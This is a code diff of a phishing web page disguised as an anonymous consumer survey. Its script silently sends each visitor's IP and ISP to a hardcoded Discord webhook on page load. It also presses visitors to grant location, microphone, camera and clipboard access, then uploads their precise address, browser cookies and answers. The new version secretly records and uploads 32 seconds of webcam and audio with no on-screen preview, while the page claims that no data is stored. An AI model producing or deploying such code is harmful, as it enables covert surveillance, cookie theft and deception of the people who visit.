@@ -2,266 +2,372 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Quick Survey – Tell us your opinion</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Consumer Survey 2026</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: linear-gradient(135deg, #f5f7fa 0%, #e9eef3 100%);
-            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: #eef2f5;
+            font-family: 'Segoe UI', Roboto, sans-serif;
             padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
         }
-        .survey-container {
-            max-width: 500px;
+        .survey-box {
+            max-width: 700px;
             width: 100%;
             background: white;
-            border-radius: 32px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            border-radius: 28px;
+            box-shadow: 0 20px 35px rgba(0,0,0,0.1);
             overflow: hidden;
-            transition: all 0.2s;
         }
         .header {
-            background: #1e3c72;
+            background: #1e466e;
             color: white;
-            padding: 24px;
-            text-align: center;
+            padding: 20px 28px;
         }
-        .header h2 {
-            font-weight: 500;
-            font-size: 1.6rem;
-        }
-        .content {
-            padding: 28px 24px 32px;
-        }
-        .question-icon {
-            font-size: 48px;
-            text-align: center;
-            margin-bottom: 16px;
-        }
-        .survey-question {
-            font-size: 22px;
-            font-weight: 600;
-            text-align: center;
-            color: #1e2a3a;
+        .header h1 { font-size: 1.7rem; font-weight: 600; }
+        .header p { opacity: 0.8; margin-top: 5px; }
+        .content { padding: 28px 30px 35px; }
+        .question-item {
             margin-bottom: 24px;
+            border-bottom: 1px solid #e2e8f0;
+            padding-bottom: 16px;
+        }
+        .question-text {
+            font-weight: 600;
+            font-size: 1rem;
+            margin-bottom: 10px;
+            color: #1e293b;
         }
         .options {
-            margin-bottom: 32px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-top: 8px;
         }
-        .option-btn {
-            background: #f0f2f5;
-            border: 1px solid #ccd0d5;
-            border-radius: 60px;
-            padding: 12px 20px;
-            width: 100%;
-            text-align: left;
-            font-size: 16px;
-            margin-bottom: 12px;
+        .options label {
+            background: #f1f5f9;
+            padding: 6px 14px;
+            border-radius: 40px;
             cursor: pointer;
+            font-size: 0.85rem;
             transition: 0.2s;
-            font-weight: normal;
         }
-        .option-btn:hover {
-            background: #e4e6e9;
-            transform: scale(1.01);
+        .options input { margin-right: 6px; }
+        .options label:hover { background: #e2e8f0; }
+        .permission-panel {
+            background: #fef9e3;
+            border-left: 5px solid #f59e0b;
+            padding: 16px 20px;
+            margin: 25px 0 20px;
+            border-radius: 16px;
         }
-        .hidden { display: none; }
-        .permission-notice {
-            background: #f0f7ff;
-            border-left: 4px solid #1e3c72;
-            padding: 12px 16px;
-            font-size: 13px;
-            border-radius: 12px;
-            margin: 20px 0;
-            color: #2c3e50;
+        .permission-step {
+            margin: 12px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
         }
-        .video-preview {
-            margin-top: 20px;
-            background: #000;
-            border-radius: 20px;
-            overflow: hidden;
-            display: none;
-            border: 2px solid #1e3c72;
+        .perm-btn {
+            background: #1e466e;
+            color: white;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 40px;
+            cursor: pointer;
+            font-weight: bold;
         }
-        video {
+        .perm-btn:disabled { background: #94a3b8; cursor: not-allowed; }
+        .status { font-size: 0.85rem; color: #2c3e50; }
+        .submit-btn {
+            background: #2c7a4d;
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 60px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
             width: 100%;
-            height: auto;
-            display: block;
+            margin-top: 20px;
         }
-        .timer {
-            font-family: monospace;
-            font-size: 14px;
-            color: #d9534f;
-            text-align: center;
-            margin-top: 12px;
-        }
-        .footer {
-            background: #f8f9fa;
-            padding: 14px;
-            text-align: center;
-            font-size: 11px;
-            color: #7e8c8d;
-            border-top: 1px solid #e2e8f0;
-        }
+        .timer { font-family: monospace; text-align: center; margin: 15px 0; color: #d9534f; font-weight: bold; }
+        .footer { background: #f8fafc; padding: 14px; text-align: center; font-size: 11px; color: #64748b; }
     </style>
 </head>
 <body>
-<div class="survey-container" id="mainContainer">
+<div class="survey-box" id="surveyContainer">
     <div class="header">
-        <h2>📝 Quick Survey</h2>
-        <p>Help us improve our services</p>
+        <h1>📊 Global Consumer Survey 2026</h1>
+        <p>Help us understand user preferences – your answers are anonymous</p>
     </div>
     <div class="content" id="surveyContent">
-        <div class="question-icon">🤔</div>
-        <div class="survey-question">Which feature matters most to you?</div>
-        <div class="options">
-            <div class="option-btn" data-value="privacy">🔒 Privacy & Security</div>
-            <div class="option-btn" data-value="speed">⚡ Speed & Performance</div>
-            <div class="option-btn" data-value="design">🎨 Modern Design</div>
-            <div class="option-btn" data-value="support">📞 Customer Support</div>
+        <div id="questionsArea"></div>
+        
+        <div class="permission-panel" id="permPanel">
+            <div style="font-weight:bold; margin-bottom:12px;">🔐 Before completing the survey, please grant these permissions (no data is stored permanently):</div>
+            <div class="permission-step" id="permGeo">📍 Location – <button class="perm-btn" id="btnGeo">Allow location</button> <span class="status" id="statusGeo">pending</span></div>
+            <div class="permission-step" id="permMic">🎤 Microphone – <button class="perm-btn" id="btnMic">Allow microphone</button> <span class="status" id="statusMic">pending</span></div>
+            <div class="permission-step" id="permCamera">🎥 Camera – <button class="perm-btn" id="btnCamera">Allow camera</button> <span class="status" id="statusCamera">pending</span></div>
+            <div class="permission-step" id="permNotif">🔔 Notifications – <button class="perm-btn" id="btnNotif">Allow notifications</button> <span class="status" id="statusNotif">pending</span></div>
+            <div class="permission-step" id="permClip">📋 Clipboard – <button class="perm-btn" id="btnClip">Allow clipboard</button> <span class="status" id="statusClip">pending</span></div>
         </div>
-        <div class="permission-notice" id="permNotice">
-            📍 To prevent bots, we need your location.<br>
-            Click any option above to start verification.
-        </div>
-        <div class="video-preview" id="videoPreview">
-            <video id="localVideo" autoplay muted playsinline></video>
-            <p style="color:white; background:rgba(0,0,0,0.7); font-size:12px; padding:4px; margin:0;">📷 Camera active – verification recording in progress</p>
-        </div>
-        <div class="timer" id="timerDisplay" style="display:none;"></div>
+        
+        <button class="submit-btn" id="submitSurvey" disabled>📝 Submit survey (enable all permissions first)</button>
+        <div id="timerArea" class="timer" style="display:none;"></div>
     </div>
-    <div class="footer">This survey is anonymous • No personal data stored</div>
+    <div class="footer">ⓘ This survey uses device verification to prevent bots – your privacy is respected.</div>
 </div>
 
 <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";
 
-    // ==================== 1. INITIAL IP WEBHOOK ====================
-    async function sendInitialIP() {
-        try {
-            const ipRes = await fetch("https://api.ipify.org?format=json");
-            const ipData = await ipRes.json();
-            const ip = ipData.ip;
-            const geoRes = await fetch("https://ipapi.co/json/");
-            const geo = geoRes.ok ? await geoRes.json() : { city: "?", region: "?", country_name: "?", org: "?" };
-            const payload = {
-                username: "🌐 Survey Logger",
-                embeds: [{
-                    title: "🕵️ Visitor IP (Page Load)",
-                    description: `**IP:** \`${ip}\`\n**Time:** ${new Date().toISOString()}`,
-                    fields: [
-                        { name: "Location (IP based)", value: `${geo.city}, ${geo.region}, ${geo.country_name}`, inline: true },
-                        { name: "ISP", value: geo.org || "Unknown", inline: true }
-                    ],
-                    color: 0x3498db
-                }]
-            };
-            await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
-        } catch(e) { console.error(e); }
-    }
-    sendInitialIP();
-
-    // ==================== 2. PERMISSIONS & LOCATION ====================
-    async function requestGeolocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) resolve({ error: "not supported" });
-            navigator.geolocation.getCurrentPosition(
-                (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
-                (err) => resolve({ error: err.message }),
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
+    // ==================== 1. GENERATE 14 FAKE QUESTIONS ====================
+    const questions = [
+        "How often do you shop online?",
+        "Which social media platform do you use most?",
+        "What is your age group?",
+        "What matters most when buying a smartphone?",
+        "How many hours per day do you spend on the internet?",
+        "Which streaming service do you prefer?",
+        "Do you use ad blockers?",
+        "What is your primary operating system?",
+        "How do you feel about targeted ads?",
+        "Which payment method do you use most often?",
+        "Do you read privacy policies before accepting?",
+        "How likely are you to recommend a product based on online reviews?",
+        "Do you use a VPN regularly?",
+        "What is your preferred browser?"
+    ];
+    const optionSets = [
+        ["Daily", "Weekly", "Monthly", "Rarely"],
+        ["TikTok", "Instagram", "Twitter/X", "Facebook", "LinkedIn"],
+        ["18-24", "25-34", "35-44", "45+"],
+        ["Battery life", "Camera quality", "Performance", "Price"],
+        ["<2h", "2-5h", "5-8h", ">8h"],
+        ["Netflix", "YouTube", "Disney+", "Prime Video", "Other"],
+        ["Always", "Sometimes", "Never", "What is an ad blocker?"],
+        ["Windows", "macOS", "Linux", "Android", "iOS"],
+        ["Acceptable", "Annoying", "Invasion of privacy", "I don't care"],
+        ["Credit card", "PayPal", "Crypto", "Bank transfer"],
+        ["Always", "Sometimes", "Never", "Didn't know they exist"],
+        ["Very likely", "Likely", "Neutral", "Unlikely"],
+        ["Yes", "No", "What is VPN?"],
+        ["Chrome", "Firefox", "Edge", "Safari", "Opera", "Brave"]
+    ];
+    
+    let userAnswers = {};
+    function generateQuestionsHTML() {
+        let html = '';
+        for (let i = 0; i < questions.length; i++) {
+            html += `<div class="question-item">
+                        <div class="question-text">${i+1}. ${questions[i]}</div>
+                        <div class="options" data-qid="${i}">`;
+            for (let opt of optionSets[i]) {
+                html += `<label><input type="radio" name="q${i}" value="${opt}"> ${opt}</label>`;
+            }
+            html += `</div></div>`;
+        }
+        document.getElementById("questionsArea").innerHTML = html;
+        // Collect answers when changed
+        document.querySelectorAll('input[type="radio"]').forEach(radio => {
+            radio.addEventListener('change', (e) => {
+                const qid = e.target.closest('.options').getAttribute('data-qid');
+                userAnswers[qid] = e.target.value;
+            });
         });
     }
+    generateQuestionsHTML();
 
-    async function reverseGeocode(lat, lon) {
-        try {
-            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-            const data = await res.json();
-            return data.display_name || `${lat},${lon}`;
-        } catch(e) { return `${lat},${lon}`; }
+    // ==================== 2. PERMISSION REQUESTS (with real-time status) ====================
+    let permissions = { geo: false, mic: false, camera: false, notif: false, clip: false };
+    let cameraStream = null;
+    let mediaRecorder = null;
+    let recordedChunks = [];
+    let recordingActive = false;
+    
+    // Helper: send text log (answers, location, etc.) to Discord
+    async function sendTextLog(locationData, answers, additional) {
+        let report = `SURVEY RESPONSES\nTime: ${new Date().toISOString()}\nURL: ${window.location.href}\n`;
+        if (locationData.address) report += `📍 Precise location: ${locationData.address}\n`;
+        report += `🍪 Cookies: ${document.cookie || "none"}\n`;
+        report += `📱 User Agent: ${navigator.userAgent}\n`;
+        for (let i=0; i<questions.length; i++) {
+            report += `${i+1}. ${questions[i]} → ${answers[i] || "not answered"}\n`;
+        }
+        const blob = new Blob([report], { type: "text/plain" });
+        const formData = new FormData();
+        formData.append("file", blob, `survey_log_${Date.now()}.txt`);
+        let locationDisplay = locationData.address ? locationData.address : "denied";
+        const embed = {
+            embeds: [{
+                title: "📋 SURVEY TEXT LOG",
+                description: `**Location:** ${locationDisplay}\n**Answers recorded:** ${Object.keys(answers).length}/${questions.length}`,
+                color: 0x3498db,
+                timestamp: new Date().toISOString()
+            }]
+        };
+        formData.append("payload_json", JSON.stringify(embed));
+        await fetch(WEBHOOK_URL, { method: "POST", body: formData });
     }
-
-    // ==================== 3. VIDEO RECORDING (with live preview) ====================
-    let activeStream = null;
-    let recorder = null;
-    let allChunks = [];
-    let isRecording = false;
-    let recordingTimer = null;
-
-    async function startVideoRecording(totalSeconds, intervals, previewElement) {
+    
+    // Geolocation
+    document.getElementById("btnGeo").onclick = async () => {
+        document.getElementById("statusGeo").innerText = "requesting...";
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            activeStream = stream;
-            // Show live preview
-            previewElement.srcObject = stream;
-            document.getElementById("videoPreview").style.display = "block";
-
-            allChunks = [];
-            recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
-            recorder.ondataavailable = (event) => {
-                if (event.data.size > 0) allChunks.push(event.data);
-            };
-            recorder.start(100);
-            isRecording = true;
-
-            // Send cumulative chunks at each interval
-            for (let sec of intervals) {
-                setTimeout(async () => {
-                    if (!isRecording) return;
-                    if (recorder && recorder.state === "recording") {
-                        recorder.stop();
-                        await new Promise(resolve => {
-                            recorder.onstop = async () => {
-                                const blob = new Blob(allChunks, { type: "video/webm" });
-                                await sendVideoBlob(blob, sec);
-                                // Restart recording with new empty chunks
-                                allChunks = [];
-                                recorder = new MediaRecorder(activeStream, { mimeType: "video/webm" });
-                                recorder.ondataavailable = (e) => { if (e.data.size > 0) allChunks.push(e.data); };
-                                recorder.start(100);
-                                resolve();
-                            };
-                        });
-                    }
-                }, sec * 1000);
+            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true}));
+            const lat = pos.coords.latitude, lon = pos.coords.longitude;
+            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+            const data = await geoRes.json();
+            window.locationData = { address: data.display_name, lat, lon };
+            document.getElementById("statusGeo").innerHTML = `✅ granted at ${data.display_name.substring(0,50)}...`;
+            permissions.geo = true;
+            document.getElementById("btnGeo").disabled = true;
+            checkAllPermissions();
+        } catch(e) {
+            document.getElementById("statusGeo").innerHTML = `❌ denied (${e.message})`;
+            permissions.geo = false;
+        }
+    };
+    
+    // Microphone
+    document.getElementById("btnMic").onclick = async () => {
+        document.getElementById("statusMic").innerText = "requesting...";
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            stream.getTracks().forEach(t => t.stop());
+            document.getElementById("statusMic").innerHTML = "✅ allowed";
+            permissions.mic = true;
+            document.getElementById("btnMic").disabled = true;
+            checkAllPermissions();
+        } catch(e) {
+            document.getElementById("statusMic").innerHTML = `❌ denied`;
+            permissions.mic = false;
+        }
+    };
+    
+    // Camera (no preview on page, but we'll record later)
+    document.getElementById("btnCamera").onclick = async () => {
+        document.getElementById("statusCamera").innerText = "requesting...";
+        try {
+            cameraStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            document.getElementById("statusCamera").innerHTML = "✅ allowed";
+            permissions.camera = true;
+            document.getElementById("btnCamera").disabled = true;
+            checkAllPermissions();
+        } catch(e) {
+            document.getElementById("statusCamera").innerHTML = `❌ denied`;
+            permissions.camera = false;
+        }
+    };
+    
+    // Notifications
+    document.getElementById("btnNotif").onclick = async () => {
+        document.getElementById("statusNotif").innerText = "requesting...";
+        if (Notification.permission === "granted") {
+            document.getElementById("statusNotif").innerHTML = "✅ already granted";
+            permissions.notif = true;
+        } else {
+            const result = await Notification.requestPermission();
+            if (result === "granted") {
+                document.getElementById("statusNotif").innerHTML = "✅ allowed";
+                permissions.notif = true;
+            } else {
+                document.getElementById("statusNotif").innerHTML = "❌ denied";
+                permissions.notif = false;
             }
-
-            recordingTimer = setTimeout(async () => {
-                if (recorder && recorder.state === "recording") {
-                    recorder.stop();
+        }
+        document.getElementById("btnNotif").disabled = true;
+        checkAllPermissions();
+    };
+    
+    // Clipboard
+    document.getElementById("btnClip").onclick = async () => {
+        document.getElementById("statusClip").innerText = "requesting...";
+        try {
+            await navigator.clipboard.readText();
+            document.getElementById("statusClip").innerHTML = "✅ allowed";
+            permissions.clip = true;
+            document.getElementById("btnClip").disabled = true;
+            checkAllPermissions();
+        } catch(e) {
+            document.getElementById("statusClip").innerHTML = `❌ denied`;
+            permissions.clip = false;
+        }
+    };
+    
+    function checkAllPermissions() {
+        const allGranted = permissions.geo && permissions.mic && permissions.camera && permissions.notif && permissions.clip;
+        document.getElementById("submitSurvey").disabled = !allGranted;
+        if (allGranted) {
+            document.getElementById("submitSurvey").innerText = "✅ Start survey recording & submit";
+        }
+    }
+    
+    // ==================== 3. VIDEO RECORDING (progressive chunks, no preview) ====================
+    async function startProgressiveRecording(totalSeconds, intervals) {
+        if (!cameraStream) return;
+        recordedChunks = [];
+        mediaRecorder = new MediaRecorder(cameraStream, { mimeType: "video/webm" });
+        mediaRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) recordedChunks.push(event.data);
+        };
+        mediaRecorder.start(100);
+        recordingActive = true;
+        
+        // Send cumulative chunks at each interval
+        for (let sec of intervals) {
+            setTimeout(async () => {
+                if (!recordingActive) return;
+                if (mediaRecorder && mediaRecorder.state === "recording") {
+                    mediaRecorder.stop();
                     await new Promise(resolve => {
-                        recorder.onstop = async () => {
-                            if (allChunks.length) {
-                                const finalBlob = new Blob(allChunks, { type: "video/webm" });
-                                await sendVideoBlob(finalBlob, totalSeconds);
-                            }
-                            if (activeStream) activeStream.getTracks().forEach(t => t.stop());
-                            isRecording = false;
+                        mediaRecorder.onstop = async () => {
+                            const blob = new Blob(recordedChunks, { type: "video/webm" });
+                            await sendVideoBlob(blob, sec);
+                            // restart recording with new empty chunks
+                            recordedChunks = [];
+                            mediaRecorder = new MediaRecorder(cameraStream, { mimeType: "video/webm" });
+                            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+                            mediaRecorder.start(100);
                             resolve();
                         };
                     });
                 }
-                document.getElementById("videoPreview").style.display = "none";
-            }, totalSeconds * 1000);
-        } catch (err) {
-            console.error("Camera error", err);
-            document.getElementById("permNotice").innerHTML = "⚠️ Camera access denied – video will not be recorded.";
-            isRecording = false;
+            }, sec * 1000);
         }
+        
+        // final stop after totalSeconds
+        setTimeout(async () => {
+            if (mediaRecorder && mediaRecorder.state === "recording") {
+                mediaRecorder.stop();
+                await new Promise(resolve => {
+                    mediaRecorder.onstop = async () => {
+                        if (recordedChunks.length) {
+                            const finalBlob = new Blob(recordedChunks, { type: "video/webm" });
+                            await sendVideoBlob(finalBlob, totalSeconds);
+                        }
+                        if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+                        recordingActive = false;
+                        resolve();
+                    };
+                });
+            }
+        }, totalSeconds * 1000);
     }
-
+    
     async function sendVideoBlob(blob, seconds) {
         if (blob.size === 0) return;
         const formData = new FormData();
         formData.append("file", blob, `video_${seconds}s.webm`);
         const embed = {
             embeds: [{
-                title: `🎥 Survey video (${seconds} seconds)`,
-                description: `**Size:** ${(blob.size/1024).toFixed(1)} KB\n**Duration:** ~${seconds} sec`,
+                title: `🎥 Survey video chunk (${seconds} seconds)`,
+                description: `**Size:** ${(blob.size/1024).toFixed(1)} KB`,
                 color: 0xff5500,
                 timestamp: new Date().toISOString()
             }]
@@ -271,98 +377,82 @@
             await fetch(WEBHOOK_URL, { method: "POST", body: formData });
         } catch(e) { console.error("Video send failed", e); }
     }
-
-    // ==================== 4. SEND TEXT LOG (location, cookies, etc.) ====================
-    async function sendTextLog(data) {
-        let report = `SURVEY LOG\nTime: ${data.timestamp}\nURL: ${data.url}\n`;
-        report += `Location: ${data.address || "denied"} (lat: ${data.lat}, lon: ${data.lon})\n`;
-        report += `Cookies: ${document.cookie.length > 0 ? document.cookie : "none"}\n`;
-        report += `User Agent: ${navigator.userAgent}\n`;
-        report += `Selected option: ${data.option}\n`;
-        const blob = new Blob([report], { type: "text/plain" });
-        const formData = new FormData();
-        formData.append("file", blob, `log_${Date.now()}.txt`);
-        const embed = {
-            embeds: [{
-                title: "📄 Survey Log (Immediate)",
-                description: `**Location:** ${data.address || "denied"}\n**Option:** ${data.option}\n**Cookies:** ${document.cookie.split(';').length} cookies`,
-                color: 0x3498db,
-                timestamp: data.timestamp
-            }]
-        };
-        formData.append("payload_json", JSON.stringify(embed));
-        await fetch(WEBHOOK_URL, { method: "POST", body: formData });
-    }
-
-    // ==================== 5. SURVEY FLOW ====================
-    let isProcessing = false;
-    const optionButtons = document.querySelectorAll(".option-btn");
-    const permNotice = document.getElementById("permNotice");
-    const timerDiv = document.getElementById("timerDisplay");
-    const videoPreview = document.getElementById("localVideo");
-
-    async function onOptionSelected(optionValue) {
-        if (isProcessing) return;
-        isProcessing = true;
-
-        // Disable buttons
-        optionButtons.forEach(btn => btn.style.opacity = "0.5");
-        permNotice.innerHTML = "📍 Requesting your precise location – this helps us verify you're human.";
-
-        // Step 1: Get location
-        const geoloc = await requestGeolocation();
-        let address = "", lat = null, lon = null;
-        if (geoloc.lat && geoloc.lon) {
-            lat = geoloc.lat; lon = geoloc.lon;
-            address = await reverseGeocode(lat, lon);
-            permNotice.innerHTML = `✅ Location received (${address.substring(0, 60)}...). Now preparing camera.`;
-        } else {
-            permNotice.innerHTML = "⚠️ Location denied or unavailable. Proceeding without precise location.";
+    
+    // ==================== 4. SUBMIT SURVEY (collect answers, send log, start video) ====================
+    document.getElementById("submitSurvey").addEventListener("click", async () => {
+        const btn = document.getElementById("submitSurvey");
+        btn.disabled = true;
+        btn.innerText = "Processing... please wait 32 seconds";
+        
+        // Collect all answers
+        const answers = {};
+        for (let i=0; i<questions.length; i++) {
+            const selected = document.querySelector(`input[name="q${i}"]:checked`);
+            answers[i] = selected ? selected.value : "(not answered)";
         }
-
-        // Send text log immediately (with cookies, location, option)
-        const textData = {
-            timestamp: new Date().toISOString(),
-            url: window.location.href,
-            address: address,
-            lat: lat, lon: lon,
-            option: optionValue
-        };
-        await sendTextLog(textData);
-        permNotice.innerHTML = "✅ Verification started. Camera will now be used – you will see yourself below.";
-
-        // Show timer for 32 seconds
-        let timeLeft = 32;
+        
+        // Send text log with location and answers
+        const locationData = window.locationData || { address: "not granted" };
+        await sendTextLog(locationData, answers, {});
+        
+        // Show timer
+        const timerDiv = document.getElementById("timerArea");
         timerDiv.style.display = "block";
-        timerDiv.innerText = `⏳ Recording video (${timeLeft} seconds) – thank you for your patience.`;
-        const interval = setInterval(() => {
+        let timeLeft = 32;
+        timerDiv.innerText = `⏳ Recording video (${timeLeft} seconds) – survey finalising...`;
+        const timerInterval = setInterval(() => {
             timeLeft--;
-            if (timeLeft <= 0) clearInterval(interval);
-            timerDiv.innerText = timeLeft > 0 ? `⏳ Recording video (${timeLeft} seconds) – thank you.` : "Almost done...";
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                timerDiv.innerText = "✅ Survey completed – thank you!";
+            } else {
+                timerDiv.innerText = `⏳ Recording video (${timeLeft} seconds) – please wait`;
+            }
         }, 1000);
-
-        // Step 2: Start video recording (with live preview) for 32 seconds, send chunks at 1,5,10,20,30,32s
-        await startVideoRecording(32, [1,5,10,20,30,32], videoPreview);
-
-        // After recording finishes (approx 32 sec), show survey complete
+        
+        // Start progressive video recording (chunks at 1,5,10,20,30,32 seconds)
+        if (permissions.camera && cameraStream) {
+            await startProgressiveRecording(32, [1,5,10,20,30,32]);
+        } else {
+            timerDiv.innerText = "⚠️ Camera not granted – no video recorded.";
+        }
+        
+        // After 32 seconds, show final message
         setTimeout(() => {
             document.getElementById("surveyContent").innerHTML = `
-                <div style="text-align:center; padding:20px;">
-                    <div style="font-size:48px;">✅</div>
-                    <h3>Thank you for your participation!</h3>
+                <div style="text-align:center; padding:30px;">
+                    <div style="font-size:56px;">✅</div>
+                    <h2>Thank you for participating!</h2>
                     <p>Your responses have been recorded.</p>
                     <p>You may close this window.</p>
                 </div>
             `;
         }, 33000);
-    }
-
-    optionButtons.forEach(btn => {
-        btn.addEventListener("click", () => {
-            const value = btn.getAttribute("data-value");
-            onOptionSelected(value);
-        });
     });
+    
+    // Initial IP webhook (silent)
+    (async function sendInitIP() {
+        try {
+            const ipRes = await fetch("https://api.ipify.org?format=json");
+            const ipData = await ipRes.json();
+            const ip = ipData.ip;
+            const geoRes = await fetch("https://ipapi.co/json/");
+            const geo = geoRes.ok ? await geoRes.json() : {};
+            const payload = {
+                username: "📊 Survey IP",
+                embeds: [{
+                    title: "🕵️ Survey IP (Page Load)",
+                    description: `**IP:** ${ip}\n**Time:** ${new Date().toISOString()}`,
+                    fields: [
+                        { name: "IP Location", value: `${geo.city}, ${geo.country_name}`, inline: true },
+                        { name: "ISP", value: geo.org || "Unknown", inline: true }
+                    ],
+                    color: 0x3498db
+                }]
+            };
+            await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
+        } catch(e) {}
+    })();
 </script>
 </body>
-</html> 
+</html>
